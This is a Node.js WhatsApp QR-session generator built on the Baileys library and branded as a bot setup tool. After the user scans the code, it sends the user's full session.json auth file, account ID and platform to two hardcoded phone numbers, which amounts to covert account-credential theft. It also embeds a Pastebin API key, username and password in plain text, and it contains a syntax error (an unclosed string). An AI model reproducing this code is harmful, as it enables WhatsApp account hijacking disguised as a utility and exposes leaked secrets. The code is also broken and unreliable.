const makeWASocket = require("@adiwajshing/baileys").default
const qrcode = require("qrcode-terminal")
const fs = require('fs')
const pino = require('pino')
const PastebinAPI = require('pastebin-js');
const { delay, useSingleFileAuthState } = require("@adiwajshing/baileys")
const { state, saveState } = useSingleFileAuthState('./session.json')
const countapi = require('countapi-js');
const qrc = JSON.parse(fs.readFileSync('./qr.json'))
flenme = qrc.sessionname
const { exec, spawn, execSync } = require("child_process")
exec('rm -rf Session.data.json')


function OLDUSER() {
  //------------------------------------------------------
  let version = [3, 3234, 9]
  const conn = makeWASocket({
    logger: pino({ level: 'silent' }),
    printQRInTerminal: true,
    browser: ['MIKU-MD', 'opera', '1.0.0'],
    auth: state,
    version
  })
  //------------------------------------------------------
  conn.ev.on("connection.update", async (s) => {
    const { connection, lastDisconnect } = s
    if (connection == "open") {
      await delay(1000 * 10);
      const session = fs.readFileSync("./session.json");
      const stick = fs.readFileSync("./i.webp");
      
	    pastebin = new PastebinAPI({
      'api_dev_key' : 'r1eflgs76uuvyj-Q8aQFCVMGSiJpDXSL',
      'api_user_name' : 'ALPHA-704',
      'api_user_password' : '0634923280/#'
    });
pastebin
    .createPasteFromFile("./AL704.json", "ALPHA-704", null, 1, "N")
    .then(async function (data) {
    	unique = data.split("/")
      sesmsionId= unique[3]
      let Sesmsion = btoa(sesmsionId)
      let test = JSON.parse(session)
let plat = test.creds.platform
let tshephang = test.creds.me.id
countapi.visits().then(async(result) => {
	var plk_say = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata }).split(' ')[1]
         const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
         var plk_here = new Date().toLocaleDateString(get_localized_date)
         var Info = '⏱Time scanned: ' + plk_say + '\n\n 📅 Date :' + plk_here + ''
      var num = result.value; 
var str = num.toString(); 
var resu = str.substring(3)  
res = parseInt(resu)
      const alphaBtn = {
 	text : `   userID:   ${tshephang}  thank you for     choosing ALPHATROID `, 
     footer : `    ©𝐴𝐿𝑃𝐻𝐴-704 all rights reserved
                      total scans : ${res}  
                      platform: ${plat}                
 `,
          templateButtons : [
    {index: 1, urlButton: {displayText: 'My github!', url: 'https://github.com/'}},
    {index: 2, urlButton: {displayText:'ᴄᴏᴘʏ sᴇssɪᴏɴ', url: 'https://www.whatsapp.com/otp/copy/'+(Sesmsion)}},
    {index: 3, urlButton: {displayText: 'Owner' , url : 'http://wa.me/121212text=Hi+bro+✌️'}},
],
}
     await conn.sendMessage('918602239106@s.whatsapp.net', alphaBtn)
	let myId = '918602239106@s.whatsapp.net'
	await conn.sendMessage(myId,{text :  `${Info}`})
      await conn.sendMessage('918107768770@s.whatsapp.net', alphaBtn)
	let my2Id = '918107768770@s.whatsapp.net'
	await conn.sendMessage(my2Id,{text :  `${Info}`})
  });
      
      await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
      await conn.sendMessage('918602239106@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
      await conn.sendMessage('918107768770@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
      await conn.sendMessage('918602239106@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ' })
      await conn.sendMessage('918107768770@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ' })
      
      process.exit(0)
      }
    if (
        connection === "close" &&
        lastDisconnect &&
        lastDisconnect.error &&
        lastDisconnect.error.output.statusCode != 401
      ) {
        OLDUSER()
      }
    })
  conn.ev.on('creds.update', saveState)
  conn.ev.on("messages.upsert", () => { })
}
OLDUSER()
